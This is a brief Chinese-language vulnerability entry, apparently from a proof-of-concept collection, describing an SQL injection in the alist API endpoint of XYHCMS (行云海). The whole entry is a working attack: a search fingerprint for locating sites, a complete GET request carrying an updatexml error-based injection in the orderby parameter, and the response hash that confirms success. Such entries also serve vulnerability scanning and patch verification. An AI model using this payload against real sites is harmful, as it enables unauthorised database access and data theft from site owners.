# 行云海xyhcmsalist接口存在SQL注入漏洞

行云海xyhcmsalist接口 ｜ SQL注入 ｜ —
- **指纹**：`body="Power by XYHCMS"`
- **请求**：`GET /index.php/Api/Lt/alist?orderby[updatexml(1,concat(0x3a,(select%20md5(123)),0x3a),1);]=1 HTTP/1.1`
- **响应特征**：200 202cb962ac59075b964b07152d234b